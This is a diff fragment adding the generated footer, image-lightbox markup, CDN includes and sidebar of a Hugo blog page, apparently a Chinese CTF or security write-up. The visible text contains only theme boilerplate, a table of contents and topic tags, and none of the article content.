+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/3.3.0/pangu.min.js', function () {
+      pangu.spacingPage();
+    });
+  </script>
+
+  <section class="copyright">
+    &copy;
+    
+    2020 -
+    
+    2023 <a href="">k0a1i</a>·<i class="fas fa-bell"></i>
+    <a id="days">0</a>Days<br>
+    共叨叨了9502字的废话</br><span>
+      
+      <p>
+  </section>
+
+  <section class="powerby">
+    Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+    Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener"
+        data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a><br />
+    
+  </section>
+
+  <script>
+    var s1 = '2023-02-09';
+    s1 = new Date(s1.replace(/-/g, "/"));
+    s2 = new Date();
+    var days = s2.getTime() - s1.getTime();
+    var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+    document.getElementById('days').innerHTML = number_of_days;
+  </script>
+
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>搜索</label>
+            <input name="keyword" required placeholder="输入关键词..." />
+        
+            <button title="搜索">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#写在前面">写在前面</a></li>
+        <li><a href="#复现">复现</a></li>
+        <li><a href="#一些奇怪的姿势">一些奇怪的姿势</a></li>
+        <li><a href="#参考资料">参考资料</a></li>
+        <li><a href="#写在后面">写在后面</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+        
+            <section class="widget categories">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">分类</h2>
+    <div class="widget-categories--list">
+        <div class="widget">
+            <h3 class="widget-title"> </h3>
+            <div class="widget-body">
+                <div class="category-list">
+                    <div class="category-list-item"><a href="https://example.com/categories/ctf/" class="category-list-link">ctf<span class="category-list-count">4</a>
+                        </span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">归档</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2023">
+                        
+                            <span class="year">2023</span>
+                            <span class="count">1</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2022">
+                        
+                            <span class="year">2022</span>
+                            <span class="count">4</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">标签云</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/web/" class="font_size_4">
+                web
+            </a>
+        
+            <a href="/tags/java/" class="font_size_2">
+                java
+            </a>
+        
+            <a href="/tags/fastjson/" class="font_size_1">
+                fastjson
+            </a>
+        
+            <a href="/tags/hugo/" class="font_size_1">
+                Hugo
+            </a>
+        
+            <a href="/tags/jndi/" class="font_size_1">
+                jndi
+            </a>
+        
+            <a href="/tags/php/" class="font_size_1">
+                php
+            </a>
+        
+            <a href="/tags/python/" class="font_size_1">
+                python
+            </a>
+        
+            <a href="/tags/sql/" class="font_size_1">
+                SQL
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
